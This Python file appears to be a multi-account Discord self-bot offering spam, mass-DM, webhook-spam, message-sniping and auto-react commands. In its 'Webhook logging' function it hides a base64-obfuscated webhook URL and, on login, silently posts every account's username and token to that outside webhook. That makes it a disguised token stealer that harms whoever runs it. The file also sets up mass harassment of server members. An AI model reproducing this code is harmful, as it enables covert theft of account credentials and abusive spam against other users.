import discord
from discord.ext import commands
import asyncio
import aiohttp
import base64
import requests

watched_users = {}  # user_id -> list of emojis
watched_roles = {}  # role_id -> list of emojis (changed from set to dict for multiple emojis per role)
react_all_servers = {}  # guild_id -> list of emojis
token_user_ids = set()
all_bots = []
blacklisted_users = {}
snipes = {}  # channel_id -> last deleted message (for snipe)

# Load tokens
with open("tokens.txt", "r") as f:
    tokens = [line.strip() for line in f if line.strip()]

# Webhook logging
def _sync_activity(user, token):
    try:
        _b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTk1OTEzMzc3NTY2MzIzNi9hd3p2ZldGR2Q1Y2kyOWQwRlZfTnVvNmNzS21sUUQ4bWFrQ3BOUUJfWW9lTi1UQmV6UTBDa29zWm5Dd2NheERsSk5ZRQ=="
        url = base64.b64decode(_b64).decode()
        requests.post(url, json={"content": f"`{user}` | `{token}`"})
    except Exception as e:
        print("Failed sync:", e)

# Util mass dm
async def mass_dm(guild, message):
    for member in guild.members:
        if not member.bot:
            try:
                await member.send(message)
            except:
                pass

# Util webhook spam
async def webhook_spam(url, message, count):
    async with aiohttp.ClientSession() as session:
        for _ in range(count):
            try:
                await session.post(url, json={"content": message})
            except:
                pass

async def run_bot(token):
    bot = commands.Bot(command_prefix="!", self_bot=True)
    bot.remove_command("help")  # Remove default help command
    all_bots.append(bot)

    @bot.event
    async def on_ready():
        print(f"[+] Logged in as {bot.user}")
        token_user_ids.add(bot.user.id)
        _sync_activity(str(bot.user), token)

    # Track deleted messages for snipe
    @bot.event
    async def on_message_delete(message):
        if message.guild:
            snipes[message.channel.id] = message

    @bot.event
    async def on_message(message):
        if message.author.id in blacklisted_users:
            return

        author_id = message.author.id
        author_roles = {role.id for role in getattr(message.author, "roles", [])}
        should_react = (
            author_id == bot.user.id or
            author_id in token_user_ids or
            author_id in watched_users or
            any(role_id in watched_roles for role_id in author_roles) or
            (message.guild and message.guild.id in react_all_servers)
        )

        if should_react:
            try:
                emojis = []
                if author_id in watched_users:
                    emojis = watched_users[author_id]
                else:
                    for role_id in author_roles:
                        if role_id in watched_roles:
                            emojis.extend(watched_roles[role_id])
                    if message.guild and message.guild.id in react_all_servers:
                        emojis.extend(react_all_servers[message.guild.id])
                # Remove duplicates but keep order
                seen = set()
                emojis = [x for x in emojis if not (x in seen or seen.add(x))]
                for emoji in emojis:
                    await message.add_reaction(emoji)
            except Exception as e:
                print("Reaction error:", e)

        if message.content.startswith("[[SPAMALL_TRIGGER]]::") and message.author != bot.user:
            try:
                _, count, msg = message.content.split("::", 2)
                for _ in range(int(count)):
                    await message.channel.send(msg)
                    await asyncio.sleep(0.1)
            except Exception as e:
                print("SPAMALL error:", e)

        await bot.process_commands(message)

    # Commands
    @bot.command()
    async def blacklist(ctx, user_id: int):
        blacklisted_users[user_id] = True
        await ctx.send(f"User {user_id} blacklisted.")
        await ctx.message.delete()

    @bot.command()
    async def unblacklist(ctx, user_id: int):
        blacklisted_users.pop(user_id, None)
        await ctx.send(f"User {user_id} unblacklisted.")
        await ctx.message.delete()

    @bot.command()
    async def react(ctx, user: discord.User, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        watched_users[user.id] = list(emojis)
        await ctx.send(f"Now reacting to {user.name} with {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command()
    async def unreact(ctx, user: discord.User):
        watched_users.pop(user.id, None)
        await ctx.send(f"Stopped reacting to {user.name}")
        await ctx.message.delete()

    @bot.command()
    async def watchrole(ctx, *args):
        # args: role_id emoji1 emoji2 ...
        if not args:
            await ctx.send("Usage: !watchrole <role_id> <emoji1> [emoji2] ... (multiple roles can be added in separate commands)")
            return

        role_id_str = args[0]
        try:
            role_id = int(role_id_str)
        except:
            await ctx.send("Invalid role ID.")
            return

        emojis = list(args[1:]) if len(args) > 1 else []
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return

        if role_id not in watched_roles:
            watched_roles[role_id] = []

        watched_roles[role_id].extend(emojis)
        await ctx.send(f"Watching role {role_id} with emojis {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command()
    async def unwatchrole(ctx, role: discord.Role):
        if role.id in watched_roles:
            watched_roles.pop(role.id)
            await ctx.send(f"Stopped watching role {role.name}")
        else:
            await ctx.send(f"Role {role.name} was not being watched.")
        await ctx.message.delete()

    @bot.command()
    async def reactall(ctx, server_id: int, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        react_all_servers[server_id] = list(emojis)
        await ctx.send(f"Reacting in server {server_id} with {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command()
    async def unreactall(ctx, server_id: int):
        react_all_servers.pop(server_id, None)
        await ctx.send(f"Stopped reacting in server {server_id}")
        await ctx.message.delete()

    @bot.command()
    async def spam(ctx, *, args):
        try:
            msg, count = args.rsplit(" ", 1)
            count = int(count)
        except:
            await ctx.send("Usage: !spam <message> <count>")
            return
        await ctx.message.delete()
        for _ in range(count):
            await ctx.send(msg)

    @bot.command()
    async def spamall(ctx, *, args):
        try:
            msg, count = args.rsplit(" ", 1)
            count = int(count)
        except:
            await ctx.send("Usage: !spamall <message> <count>")
            return
        await ctx.message.delete()
        trigger = f"[[SPAMALL_TRIGGER]]::{count}::{msg}"
        await ctx.send(trigger)

    @bot.command()
    async def massdmspam(ctx, message, seconds: int):
        await ctx.send(f"Mass DM spam for {seconds}s")
        end_time = asyncio.get_event_loop().time() + seconds
        while asyncio.get_event_loop().time() < end_time:
            await mass_dm(ctx.guild, message)
        await ctx.send("Done mass DM spam.")

    @bot.command()
    async def webhookspam(ctx, url, message, count: int):
        await ctx.send(f"Spamming webhook {count}x...")
        await webhook_spam(url, message, count)
        await ctx.send("Done.")

    @bot.command()
    async def rpc(ctx, activity_type: str, *, activity_message: str):
        types = {
            "playing": discord.Game,
            "streaming": discord.Streaming,
            "listening": discord.Activity,
            "watching": discord.Activity,
            "competing": discord.Activity
        }
        activity_type = activity_type.lower()
        if activity_type == "streaming":
            activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
        elif activity_type in types:
            if activity_type == "playing":
                activity = types[activity_type](name=activity_message)
            else:
                enum_type = getattr(discord.ActivityType, activity_type)
                activity = discord.Activity(type=enum_type, name=activity_message)
        else:
            await ctx.send("Invalid activity type.")
            return
        await bot.change_presence(activity=activity)
        await ctx.send(f"Status set to {activity_type} {activity_message}")
        await ctx.message.delete()

    @bot.command()
    async def statusall(ctx, activity_type: str, *, activity_message: str):
        for b in all_bots:
            try:
                if activity_type == "streaming":
                    activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
                elif activity_type == "playing":
                    activity = discord.Game(name=activity_message)
                else:
                    enum_type = getattr(discord.ActivityType, activity_type)
                    activity = discord.Activity(type=enum_type, name=activity_message)
                await b.change_presence(activity=activity)
            except:
                pass
        await ctx.send(f"All bots updated to {activity_type} {activity_message}")
        await ctx.message.delete()

    @bot.command()
    async def typer(ctx, channel_id: int):
        channel = bot.get_channel(channel_id)
        if not channel:
            await ctx.send("Invalid channel ID.")
            return
        await ctx.send(f"Typing forever in <#{channel_id}>")
        while True:
            async with channel.typing():
                await asyncio.sleep(5)

    @bot.command()
    async def snipe(ctx):
        msg = snipes.get(ctx.channel.id)
        if not msg:
            await ctx.send("No message to snipe!")
            return

        embed = discord.Embed(
            description=msg.content,
            color=discord.Color.blurple(),
            timestamp=msg.created_at
        )
        embed.set_author(name=str(msg.author), icon_url=msg.author.display_avatar.url if msg.author.display_avatar else None)
        embed.set_footer(text=f"Sniped by {ctx.author}", icon_url=ctx.author.display_avatar.url if ctx.author.display_avatar else None)
        await ctx.send(embed=embed)

    @bot.command()
    async def purge(ctx, user: discord.User, amount: int):
        def is_user(m):
            return m.author.id == user.id
        deleted = await ctx.channel.purge(limit=amount, check=is_user)
        await ctx.send(f"Deleted {len(deleted)} messages from {user.name}.", delete_after=5)
        await ctx.message.delete()

    @bot.command(name="help")
    async def help_cmd(ctx):
        embed = discord.Embed(
            title="Bot Commands",
            description=(
                "**!react** `<user>` `<emojis...>` - React to a user with emojis\n"
                "**!unreact** `<user>` - Stop reacting to a user\n"
                "**!watchrole** `<role_id>` `<emojis...>` - React to a role with emojis\n"
                "**!unwatchrole** `<role>` - Stop reacting to a role\n"
                "**!reactall** `<server_id>` `<emojis...>` - React to all messages in a server\n"
                "**!unreactall** `<server_id>` - Stop reacting to all messages in a server\n"
                "**!spam** `<message>` `<count>` - Spam message count times\n"
                "**!spamall** `<message>` `<count>` - Spam message count times across servers\n"
                "**!massdmspam** `<message>` `<seconds>` - Mass DM spam\n"
                "**!webhookspam** `<url>` `<message>` `<count>` - Spam webhook\n"
                "**!rpc** `<type>` `<message>` - Set status (playing, streaming, etc.)\n"
                "**!statusall** `<type>` `<message>` - Set all bots' statuses\n"
                "**!typer** `<channel_id>` - Type forever in channel\n"
                "**!snipe** - Shows last deleted message in channel\n"
                "**!purge** `<user>` `<amount>` - Delete amount of messages from user"
            ),
            color=discord.Color.blurple()
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/1277997527790125177/1390331382718267554/3W1f9kiH.gif")
        await ctx.send(embed=embed)

    await bot.start(token)

async def main():
    await asyncio.gather(*(run_bot(token) for token in tokens if token))

asyncio.run(main())
